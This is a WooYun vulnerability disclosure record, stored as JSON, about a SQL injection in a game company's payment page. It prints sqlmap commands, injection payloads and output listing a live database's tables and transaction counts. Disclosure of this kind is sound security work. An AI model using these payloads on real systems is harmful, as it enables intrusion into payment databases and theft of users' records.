{"id": 87961, "wybug_id": "wooyun-2016-0203207", "wybug_title": "游光网络爱微游平台某处SQL注入可UNION(泄漏1600万交易记录)                                      ", "wybug_corp": "游光网络", "wybug_author": "我在不想理你", "wybug_date": "2016-05-02 10:20", "wybug_open_date": "2016-06-20 19:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-20：\t细节向公众公开  简要描述： RT 详细说明：  \nhttp://**.**.**.**/\n游光网络是微信游戏比较火的开发商，允许微信不用注册直接登录玩，目前比较火的游戏有 怪兽必须死 勇士之塔 三国浮生记 都允许用微信直接支付充值 我查看了一下交易记录 每一秒都有7/8单充值记录 虽然都是小金额2块5块，但是一天下来收入统计还是很可观注入点在web充值页面\nhttp://**.**.**.**/pay/alipay2/\n\nmask 区域\n\n*****yap*****\n\n\n\n?gameid=62&uid=30833542&backurl=http://**.**.**.**&userdata=&user_coupon_id=&txid=&product_id=1 or 8=8\n放sqlmap跑\nsqlmap -u 'http://**.**.**.**/pay/alipay2/\n\nmask 区域\n\n*****yap*****\n\n\n\n?gameid=62&uid=30833542&backurl=http://**.**.**.**&userdata=&user_coupon_id=&txid=&product_id=1 or 8=8' -p 'product_id'         _ ___ ___| |_____ ___ ___  {**.**.**.**#dev}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:46:06[20:46:07] [WARNING] it appears that you have provided tainted parameter values ('product_id=1 or 8=8') with most probably leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properlyare you really sure that you want to continue (sqlmap could have problems)? [y/N] y[20:46:08] [INFO] resuming back-end DBMS 'mysql' [20:46:08] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: product_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: gameid=62&uid=30833542&backurl=http://**.**.**.**&userdata=&user_coupon_id=&txid=&product_id=1 or 8=8 AND 9197=9197    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: gameid=62&uid=30833542&backurl=http://**.**.**.**&userdata=&user_coupon_id=&txid=&product_id=1 or 8=8 AND (SELECT * FROM (SELECT(SLEEP(5)))ERLp)    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: gameid=62&uid=30833542&backurl=http://**.**.**.**&userdata=&user_coupon_id=&txid=&product_id=-2170 UNION ALL SELECT CONCAT(0x717a7a7071,0x4978706a5555576761676c5362744f51736a417a59584c594a59524749636441446e784c64546671,0x717a627671),NULL,NULL-- ----[20:46:08] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5.0.12\n   漏洞证明：  数据库\nsqlmap -u 'http://**.**.**.**/pay/alipay2/\n\nmask 区域\n\n*****yap*****\n\n\n\n?gameid=62&uid=30833542&backurl=http://**.**.**.**&userdata=&user_coupon_id=&txid=&product_id=1 or 8=8' -p 'product_id' -D money --tables --count         _ ___ ___| |_____ ___ ___  {**.**.**.**#dev}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:47:00[20:47:00] [WARNING] it appears that you have provided tainted parameter values ('product_id=1 or 8=8') with most probably leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properlyare you really sure that you want to continue (sqlmap could have problems)? [y/N] y[20:47:01] [INFO] resuming back-end DBMS 'mysql' [20:47:01] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: product_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: gameid=62&uid=30833542&backurl=http://**.**.**.**&userdata=&user_coupon_id=&txid=&product_id=1 or 8=8 AND 9197=9197    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: gameid=62&uid=30833542&backurl=http://**.**.**.**&userdata=&user_coupon_id=&txid=&product_id=1 or 8=8 AND (SELECT * FROM (SELECT(SLEEP(5)))ERLp)    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: gameid=62&uid=30833542&backurl=http://**.**.**.**&userdata=&user_coupon_id=&txid=&product_id=-2170 UNION ALL SELECT CONCAT(0x717a7a7071,0x4978706a5555576761676c5362744f51736a417a59584c594a59524749636441446e784c64546671,0x717a627671),NULL,NULL-- ----[20:47:01] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5.0.12[20:47:01] [INFO] fetching tables for database: 'money'[20:47:01] [INFO] the SQL query used returns 19 entries[20:47:01] [INFO] resumed: channel_tradeno[20:47:01] [INFO] resumed: cp_trans[20:47:01] [INFO] resumed: distr_stat[20:47:01] [INFO] resumed: distr_sum[20:47:01] [INFO] resumed: game_v2[20:47:01] [INFO] resumed: marchant[20:47:01] [INFO] resumed: mch_func_priv[20:47:01] [INFO] resumed: mch_games[20:47:01] [INFO] resumed: mch_priv[20:47:01] [INFO] resumed: online[20:47:01] [INFO] resumed: product_sum[20:47:01] [INFO] resumed: product_v2[20:47:01] [INFO] resumed: register[20:47:01] [INFO] resumed: sum[20:47:01] [INFO] resumed: talking_data_result[20:47:01] [INFO] resumed: trans[20:47:01] [INFO] resumed: trans_back[20:47:01] [INFO] resumed: user_channel_sum[20:47:01] [INFO] resumed: user_channel_transDatabase: money                                                                [19 tables]+---------------------+| sum                 || channel_tradeno     || cp_trans            || distr_stat          || distr_sum           || game_v2             || marchant            || mch_func_priv       || mch_games           || mch_priv            || online              || product_sum         || product_v2          || register            || talking_data_result || trans               || trans_back          || user_channel_sum    || user_channel_trans  |+---------------------+[20:47:01] [WARNING] missing table parameter, sqlmap will retrieve the number of entries for all database management system databases' tablesDatabase: money+---------------------+---------+| Table               | Entries |+---------------------+---------+| trans               | 16486615 || trans_back          | 14759999 || online              | 7397218 || cp_trans            | 113319  || product_sum         | 27005   || `sum`               | 15403   || talking_data_result | 11257   || user_channel_sum    | 3924    || distr_sum           | 2431    || channel_tradeno     | 1776    || product_v2          | 687     || distr_stat          | 571     || mch_games           | 150     || game_v2             | 89      || marchant            | 78      || register            | 45      || mch_priv            | 5       || mch_func_priv       | 1       |+---------------------+---------+\n1600W交易记录   修复方案：  过滤   版权声明：转载请注明来源 我在不想理你@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-05-06 19:37 厂商回复： CNVD未直接确认所述情况，已经由CNVD通过网站公开联系方式向网站管理单位通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-02 10:44 |    \t\tsauce \t\t\t( 普通白帽子  |\t\t\t        Rank:285 漏洞数:46        | 面向人民币编程)\t\t \n  你没治了    \n     2016-05-02 14:18 |    \t\t我在不想理你 \t\t\t( 普通白帽子  |\t\t\t        Rank:186 漏洞数:60        | 人生路漫漫)\t\t \n  @sauce 第一次上头条     \n     2016-05-02 15:52 |    \t\tExploit DB \t\t\t( 普通白帽子  |\t\t\t        Rank:699 漏洞数:156        | 水能载舟，亦可覆舟。)\t\t \n  呵呵 洞主可以来我的一个交流群探讨一下。    \n     2016-05-02 16:10 |    \t\tFreebug \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:39        | 流氓是一种高尚的职业！)\t\t \n  火速留名    \n     2016-05-02 17:55 |    \t\thear7v \t\t\t( 普通白帽子  |\t\t\t        Rank:175 漏洞数:26        | 求组织收留啊)\t\t \n  @我在不想理你 原来在这啊    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}